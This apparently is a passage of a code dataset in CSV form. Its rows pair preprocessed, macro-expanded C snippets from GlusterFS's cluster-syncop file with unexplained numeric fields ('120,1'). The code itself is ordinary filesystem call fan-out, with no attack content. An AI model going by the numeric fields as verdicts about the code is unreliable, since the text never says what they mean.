        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fgetxattr_cbk) tmp_cbk = cluster_fgetxattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fgetxattr""; _new->unwind_to = ""cluster_fgetxattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fgetxattr_cbk = cluster_fgetxattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fgetxattr); subvols[__i]->fops->fgetxattr (_new, subvols[__i], fd, name, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fsetxattr_cbk) tmp_cbk = cluster_fsetxattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fsetxattr""; _new->unwind_to = ""cluster_fsetxattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fsetxattr_cbk = cluster_fsetxattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fsetxattr); subvols[__i]->fops->fsetxattr (_new, subvols[__i], fd, dict, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                   int32_t flags, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fsetxattr_cbk) tmp_cbk = cluster_fsetxattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fsetxattr""; _new->unwind_to = ""cluster_fsetxattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fsetxattr_cbk = cluster_fsetxattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fsetxattr); subvols[__i]->fops->fsetxattr (_new, subvols[__i], fd, dict, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                       ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->setxattr_cbk) tmp_cbk = cluster_setxattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->setxattr""; _new->unwind_to = ""cluster_setxattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->setxattr_cbk = cluster_setxattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->setxattr); subvols[__i]->fops->setxattr (_new, subvols[__i], loc, dict, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                  int32_t flags, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->setxattr_cbk) tmp_cbk = cluster_setxattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->setxattr""; _new->unwind_to = ""cluster_setxattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->setxattr_cbk = cluster_setxattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->setxattr); subvols[__i]->fops->setxattr (_new, subvols[__i], loc, dict, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                       ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->statfs_cbk) tmp_cbk = cluster_statfs_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->statfs""; _new->unwind_to = ""cluster_statfs_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->statfs_cbk = cluster_statfs_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->statfs); subvols[__i]->fops->statfs (_new, subvols[__i], loc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                call_frame_t *frame, xlator_t *this, loc_t *loc, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->statfs_cbk) tmp_cbk = cluster_statfs_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->statfs""; _new->unwind_to = ""cluster_statfs_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->statfs_cbk = cluster_statfs_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->statfs); subvols[__i]->fops->statfs (_new, subvols[__i], loc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                          ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fsyncdir_cbk) tmp_cbk = cluster_fsyncdir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fsyncdir""; _new->unwind_to = ""cluster_fsyncdir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fsyncdir_cbk = cluster_fsyncdir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fsyncdir); subvols[__i]->fops->fsyncdir (_new, subvols[__i], fd, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                  dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fsyncdir_cbk) tmp_cbk = cluster_fsyncdir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fsyncdir""; _new->unwind_to = ""cluster_fsyncdir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fsyncdir_cbk = cluster_fsyncdir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fsyncdir); subvols[__i]->fops->fsyncdir (_new, subvols[__i], fd, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                 ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->opendir_cbk) tmp_cbk = cluster_opendir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->opendir""; _new->unwind_to = ""cluster_opendir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->opendir_cbk = cluster_opendir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->opendir); subvols[__i]->fops->opendir (_new, subvols[__i], loc, fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                 dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->opendir_cbk) tmp_cbk = cluster_opendir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->opendir""; _new->unwind_to = ""cluster_opendir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->opendir_cbk = cluster_opendir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->opendir); subvols[__i]->fops->opendir (_new, subvols[__i], loc, fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                              ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fstat_cbk) tmp_cbk = cluster_fstat_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fstat""; _new->unwind_to = ""cluster_fstat_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fstat_cbk = cluster_fstat_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fstat); subvols[__i]->fops->fstat (_new, subvols[__i], fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"               call_frame_t *frame, xlator_t *this, fd_t *fd, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fstat_cbk) tmp_cbk = cluster_fstat_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fstat""; _new->unwind_to = ""cluster_fstat_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fstat_cbk = cluster_fstat_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fstat); subvols[__i]->fops->fstat (_new, subvols[__i], fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                          ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fsync_cbk) tmp_cbk = cluster_fsync_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fsync""; _new->unwind_to = ""cluster_fsync_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fsync_cbk = cluster_fsync_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fsync); subvols[__i]->fops->fsync (_new, subvols[__i], fd, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"               dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fsync_cbk) tmp_cbk = cluster_fsync_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fsync""; _new->unwind_to = ""cluster_fsync_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fsync_cbk = cluster_fsync_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fsync); subvols[__i]->fops->fsync (_new, subvols[__i], fd, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                 ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->flush_cbk) tmp_cbk = cluster_flush_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->flush""; _new->unwind_to = ""cluster_flush_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->flush_cbk = cluster_flush_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->flush); subvols[__i]->fops->flush (_new, subvols[__i], fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"               call_frame_t *frame, xlator_t *this, fd_t *fd, dict_t *xdata)
{
